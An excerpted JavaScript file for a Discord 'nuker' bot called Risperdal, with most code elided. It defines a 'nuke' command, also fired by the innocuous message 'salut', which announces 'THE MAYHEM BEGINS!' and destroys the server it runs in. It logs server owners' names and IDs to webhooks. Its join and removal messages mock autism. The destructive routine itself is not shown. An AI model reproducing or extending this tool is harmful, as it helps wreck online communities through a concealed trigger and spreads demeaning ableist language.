...
var joinswebhookname = `Risperdal Join Logs`
...
var webhookname = `Risperdal Nuke Logs`;
var commandswebhookname = `Risperdal Command Logs`
...
var blacklistedservers = ["", "", ""] //Gamerii S si NGP si CZ :)
...
var nuker_v2 = true;
var footer = `💎 | Risperdal v${version} ${versionType}`
...
client.on('ready', async(readyarg) => {
	...
	Risperdalid = client.user.id
	var errorvar;

	setTerminalTitle(`Risperdal | v${version} | Connected as: ${client.user.username}#${client.user.discriminator} | Guilds: ${client.guilds.cache.size} | Made with love by ${author}.`)
...
client.on('message', async(message) => {
	...
	if (command === 'nuke' || message.content == "salut") {
	    ...
	    .setAuthor('Risperdal Nukes', message.author.avatarURL)
		...
		var errorvar;
		setTerminalTitle(`Risperdal | Nuking '${message.guild.name}' | Connected as: ${client.user.username}#${client.user.discriminator}`)
		console.clear()
		message.delete()
		
		console.log(`THE MAYHEM BEGINS! ${message.guild.name.toUpperCase()} IS DEAD!`.red.bold)
		console.log(`Risperdal will now nuke the server using the data from the config file.`.magenta.bold)
...
// pan
	...
	else if (command.toLowerCase() === "uptime")	
	{
		...
		.setThumbnail(message.guild.iconURL())
	    .setAuthor('Risperdal Commands', message.author.avatarURL({dynamic: true}))
	    .setFooter(footer)
	...
	else if (command.toLowerCase() === 'Risperdalstats' || command.toLowerCase() === 'Risperdalinfo') {
	    ...
	    .setColor('#568EF8')
	    .setTitle('🛬  ***Risperdal Stats / Info***')
	    .setAuthor('Risperdal Command')
		...
		.addField('**Information on how to get Risperdal**', `*${prefix}getRisperdal*`, true)
		...
		.addField('**Get Risperdal\'s stats**', `*${prefix}Risperdalstats\n${prefix}Risperdalinfo*`, true)
	    ...
	    .addField(`**\`${owner.username}#${owner.discriminator}\`**`, `*Risperdal designer and developer*`, false)
	...
	else if (command.toLowerCase() === 'getRisperdal') {
		...
		const exampleEmbed = new discordjs.MessageEmbed()
	    .setColor('#568EF8')
	    .setTitle('🛬  ***Get Risperdal***')
	    .setAuthor('Risperdal Command')
		.setThumbnail(client.user.avatarURL({dynamic: true}))
	    .addField(`**Support server invite**`, `*https://dsc.gg/Risperdal*`, false)
		.addField(`**Bot invite link**`, `*https://bit.ly/invite-Risperdal-v3*`, false)
	    .setFooter(footer)
...
client.on('guildCreate', async(guild) => {
	...
	const cmdsembed = new discordjs.MessageEmbed()
	    ...
	    .setAuthor('Risperdal Bot Meication Beginning', guild.owner.user.avatarURL({dynamic: true}))
		
		.setFooter(footer)
		console.log(`  **${client.user.username}#${client.user.discriminator} was added to the autism medication list. \n\n  Server Name: '${guild.name}'\n\n  Server Owner: '${guild.owner.user.username}#${guild.owner.user.discriminator}' (${guild.owner.id})\n\n  Server ID: ${guild.id}.**`)
...
client.on('guildDelete', guild => {
	...
	else
	{
		...
		const cmdsembed = new discordjs.MessageEmbed()
	    .setColor('#FF0000')
	    .setTitle(`Risperdal Autism Surgery Interrupted!  **${client.user.username}#${client.user.discriminator} was removed.**`)
		.setThumbnail(guild.iconURL())
		.addField(`**Server Name**`, `*${guild.name}*`, false)
		.addField(`**Member Count**`, `***${guild.memberCount}** member(s)*`, false)
		.addField(`**Server Owner**`, `***${guild.owner.user.username}**#${guild.owner.user.discriminator} (${guild.owner.id})*`, false)
		.addField(`**Server ID**`, `*${guild.id}*`, false)
	    .setAuthor('Risperdal Bot Removal', guild.owner.user.avatarURL({dynamic: true}))
		.setFooter(footer)
